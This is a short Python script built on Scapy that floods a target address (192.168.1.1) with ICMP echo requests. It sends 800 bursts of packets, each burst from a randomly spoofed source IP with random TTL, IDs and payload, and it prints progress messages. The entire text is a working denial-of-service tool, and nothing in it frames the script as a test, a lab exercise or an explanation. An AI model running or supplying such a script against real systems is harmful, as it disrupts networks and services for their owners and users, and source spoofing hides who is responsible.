from scapy.all import *
import random, time

TARGET_IP = "192.168.1.1"
FLOWS = 800
MIN_PACKETS, MAX_PACKETS = 5, 30

print(f"[*] Starting ICMP Flood -> {TARGET_IP}")
for f in range(FLOWS):
    src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    ttl = random.randint(32, 128)
    packets = random.randint(MIN_PACKETS, MAX_PACKETS)
    for p in range(packets):
        payload = bytes([random.randint(0, 255) for _ in range(random.randint(10, 100))])
        pkt = IP(
            src=src_ip, dst=TARGET_IP, ttl=ttl, id=random.randint(1, 65535)
        ) / ICMP(
            type=8, code=0,                        # Echo Request
            id=random.randint(0, 65535),
            seq=random.randint(0, 65535)
        ) / Raw(load=payload)
        send(pkt, verbose=0)
        time.sleep(random.uniform(0.001, 0.01))
    time.sleep(random.uniform(0.01, 0.05))
    if (f + 1) % 20 == 0:
        print(f"[+] {f + 1}/{FLOWS} flows sent")
print("[*] Done.")